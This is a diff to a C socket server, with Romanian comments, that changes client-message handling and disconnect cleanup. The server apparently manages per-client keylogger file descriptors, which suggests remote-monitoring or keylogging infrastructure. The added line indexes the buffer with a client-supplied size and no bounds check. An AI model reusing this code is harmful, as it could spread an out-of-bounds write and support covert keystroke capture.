@@ -56,17 +56,17 @@ void* handle_client(void* params) {
 
     // Primesc date de la client
     while ((read_size = recv(args->client_sock, &client_message, sizeof(client_message), 0)) > 0) {
-        printf("Mesaj primit de la %d(OpCode: %c): %s\n", args->client_sock, client_message.opCode, client_message.buffer);
+        client_message.buffer[client_message.size] = '\0';
+        //printf("Mesaj primit de la %d(OpCode: %c): %s\n", args->client_sock, client_message.opCode, client_message.buffer);
         handleOpcode(client_message, args->client_sock);
-        memset(client_message.buffer, 0, sizeof(client_message.buffer));
 
     }
 
-    if (read_size == 0) {
-        printf("Clientul %d s-a deconectat.\n", args->client_sock);
-    } else if (read_size == -1) {
-        perror("Eroare la primirea datelor");
-    }
+    // if (read_size == 0) {
+    //     printf("Clientul %d s-a deconectat.\n", args->client_sock);
+    // } else if (read_size == -1) {
+    //     perror("Eroare la primirea datelor");
+    // }
 
     // Curățare resurse
     if (clientHndler.clientsAttr[args->client_sock].keylogger_fd != -1) {
@@ -74,6 +74,19 @@ void* handle_client(void* params) {
         clientHndler.clientsAttr[args->client_sock].keylogger_fd = -1;
     }
     close(args->client_sock);
+    
+    for(int i = 0; i < clientHndler.numberClients; i++)
+    {
+        if (clientHndler.socketsClients[i] == args->client_sock)
+        {
+            for(int j = i; j < clientHndler.numberClients - 1; j++)
+            {
+                clientHndler.socketsClients[j] = clientHndler.socketsClients[j+1];
+            }
+            clientHndler.numberClients--;
+            break;
+        }
+    }
 
     free(params);
     return NULL;
